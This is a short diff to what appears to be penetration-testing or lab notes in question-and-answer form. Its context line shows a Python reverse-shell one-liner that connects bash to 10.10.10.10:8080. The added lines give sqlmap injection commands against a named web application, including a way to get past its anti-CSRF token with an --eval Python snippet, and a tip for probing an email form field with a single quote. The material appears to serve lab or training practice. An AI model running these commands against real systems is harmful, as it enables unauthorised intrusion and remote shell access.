@@ -16,3 +16,12 @@ import os; os.system('/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.10.10/8080 0
 
 ### In what way can you try to trip up a web form that uses html tags in order to check syntax?
 As an example case with `<input ... type='email'>`, you can inspect the tag and change the type to `text` and try submitting a single quote (`'`).
+
+### How do you use sqlmap when the site has an anti-CSRF token mechanism?
+```
+sqlmap -u http://personnel.wey-tech.com/application-check.php --data="applicantmail=blah&token=M" --csrf-url="http://personnel.wey-tech.com/validator.php?null" --csrf-token=token -v 6
+```
+If that doesn't work, you may need to use `eval` to write a custom python script.
+```
+sqlmap -u http://personnel.wey-tech.com/application-check.php --data="applicantmail=blah&token=M" --eval "import time;time.sleep(1);import urllib;page = urllib.urlopen('http://personnel.wey-tech.com/validator.php');token = urllib.quote(str(page.read()).decode('utf-8'));print(token)" -p applicantmail --user-agent='Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0' -v 4
+```
